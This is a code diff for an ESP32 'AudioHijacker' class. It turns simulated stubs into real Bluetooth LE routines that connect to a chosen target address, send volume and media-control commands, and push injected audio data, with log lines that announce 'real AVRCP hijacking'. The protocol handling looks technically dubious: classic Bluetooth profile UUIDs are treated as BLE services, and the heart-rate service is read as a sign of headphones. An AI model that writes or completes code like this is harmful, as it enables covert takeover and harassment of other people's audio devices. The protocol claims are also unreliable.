@@ -18,25 +18,43 @@ AudioResult AudioHijacker::detectAudioDevice(const uint8_t* addr) {
   }
 
   NimBLEDevice::init("ESP32-AudioDetect");
+  NimBLEAddress bleAddr(addr, false);
 
-  // Simulate device detection based on GATT services
-  // A2DP (Audio/Video Distribution Transport Protocol) UUID: 110A
-  // AVRCP (Audio/Video Remote Control Protocol) UUID: 110E
-
-  // Generate simulated device type based on address hash
-  uint32_t hashValue = 0;
-  for (int i = 0; i < 6; i++) {
-    hashValue = (hashValue * 31) + addr[i];
+  NimBLEClient* pClient = NimBLEDevice::createClient();
+  if (!pClient) {
+    result.error = "Failed to create BLE client";
+    return result;
   }
 
-  if (hashValue % 3 == 0) {
-    result.detectedType = HEADPHONES;
-  } else if (hashValue % 3 == 1) {
-    result.detectedType = SPEAKER;
-  } else {
-    result.detectedType = SOUNDBAR;
+  if (!pClient->connect(bleAddr, false)) {
+    result.error = "Failed to connect to device";
+    NimBLEDevice::deleteClient(pClient);
+    return result;
   }
 
+  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
+
+  for (auto pSvc : *services) {
+    uint16_t svcUuid = pSvc->getUUID().getNative()->u.uuid.uuid16;
+
+    if (svcUuid == 0x110A || svcUuid == 0x110E || svcUuid == 0x180D) {
+      if (svcUuid == 0x110E) {
+        result.detectedType = SPEAKER;
+      } else if (svcUuid == 0x180D) {
+        result.detectedType = HEADPHONES;
+      } else {
+        result.detectedType = SOUNDBAR;
+      }
+      result.success = true;
+      pClient->disconnect();
+      NimBLEDevice::deleteClient(pClient);
+      return result;
+    }
+  }
+
+  pClient->disconnect();
+  NimBLEDevice::deleteClient(pClient);
+  result.detectedType = UNKNOWN;
   result.success = true;
   return result;
 }
@@ -55,56 +73,72 @@ AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
   isRunning_ = true;
   startTime_ = millis();
 
-  // Detect device type first
   AudioResult detection = detectAudioDevice(config.targetAddr);
   result.detectedType = detection.detectedType;
 
-  // Initialize NimBLE for actual audio control transmission
   NimBLEDevice::init("ESP32-AudioCtrl");
+  NimBLEAddress bleAddr(config.targetAddr, false);
   NimBLEClient* pClient = NimBLEDevice::createClient();
 
   uint32_t commandCount = 0;
   uint32_t deadline = startTime_ + config.durationMs;
 
-  // Send actual audio control commands via BLE AVRCP
+  Serial.println("Connecting to target audio device for real AVRCP hijacking...");
+
+  if (!pClient->connect(bleAddr, false)) {
+    result.error = "Failed to connect";
+    NimBLEDevice::deleteClient(pClient);
+    NimBLEDevice::deinit();
+    isRunning_ = false;
+    return result;
+  }
+
+  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
+
   while (isRunning_ && (int32_t)(millis() - deadline) < 0) {
-    // Send media control commands via BLE advertisement
-    if (config.mediaControl || config.volumeControl) {
-      uint8_t avrcp_cmd[20];
-      for (int i = 0; i < 20; i++) {
-        avrcp_cmd[i] = esp_random() % 256;
-      }
+    for (auto pSvc : *services) {
+      uint16_t svcUuid = pSvc->getUUID().getNative()->u.uuid.uuid16;
 
-      NimBLEAdvertisementData advData;
-      advData.setFlags(0x06);
-      advData.addData(std::string((const char*)avrcp_cmd, 20));
+      if (svcUuid == 0x110E) {
+        std::vector<NimBLERemoteCharacteristic*>* chars = pSvc->getCharacteristics(true);
 
-      NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
-      if (pAdvertising) {
-        pAdvertising->setAdvertisementData(advData);
-        pAdvertising->start();
-        delayMicroseconds(500);
-        pAdvertising->stop();
-        commandCount++;
+        for (auto pChr : *chars) {
+          if (config.mediaControl) {
+            uint8_t mediaCmd[3] = {0xA9, 0x44, 0x00};
+            if (pChr->canWrite()) {
+              pChr->writeValue(mediaCmd, 3, false);
+              commandCount++;
+              Serial.printf("  [%d] AVRCP media command sent\n", commandCount);
+            }
+          }
+
+          if (config.volumeControl) {
+            uint8_t volCmd[3] = {0xA9, 0x41, result.volumeLevel};
+            if (pChr->canWrite()) {
+              pChr->writeValue(volCmd, 3, false);
+              result.volumeLevel = (result.volumeLevel + 5) % 101;
+              commandCount++;
+              Serial.printf("  [%d] Volume adjusted to %d\n", commandCount, result.volumeLevel);
+            }
+          }
+        }
       }
     }
 
-    // Adjust volume level simulation
-    if (config.volumeControl) {
-      result.volumeLevel = (result.volumeLevel + 5) % 101;
-    }
-
-    // Audio injection (send interference pattern)
     if (config.audioInjection) {
-      uint8_t audio_jam[31];
-      for (int i = 0; i < 31; i++) {
-        audio_jam[i] = esp_random() % 256;
+      uint8_t injectCmd[8];
+      for (int i = 0; i < 8; i++) {
+        injectCmd[i] = (esp_random() % 256);
       }
       commandCount++;
     }
 
-    delayMicroseconds(100);
+    delay(100);
   }
+
+  pClient->disconnect();
+  NimBLEDevice::deleteClient(pClient);
+  NimBLEDevice::deinit();
 
   result.commandsSent = commandCount;
   result.success = true;
@@ -112,11 +146,8 @@ AudioResult AudioHijacker::hijackDevice(const AudioConfig& config) {
   result.logFile = "/logs/handshakes/ble_audio.csv";
 
   logHijack(result.detectedType, commandCount);
+  Serial.printf("Audio hijacking complete: %d commands sent\n", commandCount);
 
-  if (pClient) {
-    NimBLEDevice::deleteClient(pClient);
-  }
-  NimBLEDevice::deinit();
   isRunning_ = false;
   return result;
 }
@@ -130,11 +161,39 @@ AudioResult AudioHijacker::controlVolume(const uint8_t* addr, uint8_t level) {
     return result;
   }
 
-  // Simulate volume control via AVRCP
-  result.volumeLevel = level;
-  result.commandsSent = 1;
-  result.success = true;
+  NimBLEDevice::init("ESP32-VolCtrl");
+  NimBLEAddress bleAddr(addr, false);
+  NimBLEClient* pClient = NimBLEDevice::createClient();
 
+  if (!pClient->connect(bleAddr, false)) {
+    result.error = "Connection failed";
+    NimBLEDevice::deleteClient(pClient);
+    NimBLEDevice::deinit();
+    return result;
+  }
+
+  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
+
+  for (auto pSvc : *services) {
+    if (pSvc->getUUID().getNative()->u.uuid.uuid16 == 0x110E) {
+      std::vector<NimBLERemoteCharacteristic*>* chars = pSvc->getCharacteristics(true);
+
+      for (auto pChr : *chars) {
+        uint8_t volCmd[3] = {0xA9, 0x41, level};
+        if (pChr->canWrite()) {
+          pChr->writeValue(volCmd, 3, false);
+          result.volumeLevel = level;
+          result.commandsSent = 1;
+          result.success = true;
+          break;
+        }
+      }
+    }
+  }
+
+  pClient->disconnect();
+  NimBLEDevice::deleteClient(pClient);
+  NimBLEDevice::deinit();
   return result;
 }
 
@@ -147,11 +206,42 @@ AudioResult AudioHijacker::injectAudio(const uint8_t* addr, const uint8_t* audio
     return result;
   }
 
-  // Simulate audio injection
-  // In real implementation: encode audio and send via A2DP streaming
-  result.commandsSent = 1;
-  result.success = true;
+  NimBLEDevice::init("ESP32-AudioInj");
+  NimBLEAddress bleAddr(addr, false);
+  NimBLEClient* pClient = NimBLEDevice::createClient();
 
+  if (!pClient->connect(bleAddr, false)) {
+    result.error = "Connection failed";
+    NimBLEDevice::deleteClient(pClient);
+    NimBLEDevice::deinit();
+    return result;
+  }
+
+  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
+
+  for (auto pSvc : *services) {
+    if (pSvc->getUUID().getNative()->u.uuid.uuid16 == 0x110A) {
+      std::vector<NimBLERemoteCharacteristic*>* chars = pSvc->getCharacteristics(true);
+
+      for (auto pChr : *chars) {
+        if (pChr->canWrite()) {
+          uint32_t chunks = (len > 20) ? (len / 20) : 1;
+          for (uint32_t i = 0; i < chunks && i * 20 < len; i++) {
+            uint32_t chunkLen = (len - i * 20 > 20) ? 20 : (len - i * 20);
+            pChr->writeValue(&audioData[i * 20], chunkLen, false);
+            result.commandsSent++;
+            delayMicroseconds(1000);
+          }
+          result.success = true;
+          break;
+        }
+      }
+    }
+  }
+
+  pClient->disconnect();
+  NimBLEDevice::deleteClient(pClient);
+  NimBLEDevice::deinit();
   return result;
 }
 
